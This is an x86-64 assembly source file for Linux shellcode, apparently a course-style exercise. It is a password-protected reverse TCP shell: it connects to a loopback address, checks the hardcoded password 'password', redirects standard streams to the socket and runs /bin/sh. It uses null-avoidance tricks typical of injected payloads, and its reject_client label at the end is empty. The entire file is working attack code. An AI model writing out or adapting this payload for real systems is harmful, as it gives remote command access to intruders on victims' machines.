BITS 64

global _start

section .text

_start:
    ; socket(int, int type, int protocol);
    mov al, 41     ; system call number
    mov dil, 2      ; domain = AF_INET (= 2)
    xor rsi,rsi
    mov sil, 1      ; type = SOCK_STREAM (= 1)
    xor rdx,rdx     ; protocol = 0
    syscall
    mov rdi, rax    ; save return value to rdi
    mov r9, rdi

    ; connect(sock, (struct sockaddr *)&server, sockaddr_len)
    xor rax, rax 
    push rax
    push dword 0x01ffff7f ; avoid nulls
    not word [rsp+1]
	push word 0x4405
	push word 0x2

	mov rsi, rsp
	mov dl, 16
    mov al, 42     ; system call number
	syscall



    ; read(socket, pw_attempt, 8);
    xor al, al
    push rax        ; reserve 8bytes space on the stack
    mov rsi, rsp    ; password buffer space (the password entered)
    xor rdx, rdx
    mov dl, 8      ; pw len = 8
    syscall

    ; compare password
    mov rcx, 0x64726f7773736170 ; password
    push rcx
    mov rdi, rsp
    cmpsq
    jne reject_client
    xor rsi, rsi

    ; dup2(client, 0);
    mov rdi, r9
    mov al, 33
    syscall

    ; dup2(client, 1);
    mov al, 33
    inc esi
    syscall

    ; dup2(client, 2);
    mov al, 33
    inc esi
    syscall

    ; execve("/bin//sh",0, 0)
    mov al, 59
    push rbx             ; '\0'
    mov rcx, 0x68732f2f6e69622f ; /bin//sh
    push rcx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall

reject_client: